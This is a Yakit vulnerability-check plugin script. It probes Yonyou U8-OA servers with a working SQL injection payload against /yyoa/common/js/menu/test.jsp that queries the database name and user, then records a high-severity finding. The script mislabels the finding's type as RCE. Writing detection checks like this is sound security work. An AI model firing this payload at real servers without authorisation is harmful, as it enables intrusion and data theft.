# port scan plugin
yakit.AutoInitYakit()

// title="用友U8-OA"
handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAnyOfRegexp(rsp, `<td align=left>(.*)</td>`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200 OK`){
            yakit.Info("%v 用友U8-OA_test SQL注入", addr)
            risk.NewRisk(
            addr,risk.title("用友U8-OA_test SQL注入"),
            risk.severity("high"),
            risk.titleVerbose("用友U8-OA_test SQL注入存在"),
            risk.type("RCE[用友ERP NC]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            // risk.details({
            //     "req": string(req),
            //     "rsp": string(rsp),
            // }),
        )
        }else{
            println("不存在用友U8-OA_test SQL注入")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/yyoa/common/js/menu/test.jsp?doType=101&S1=(select%20database(),user())`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
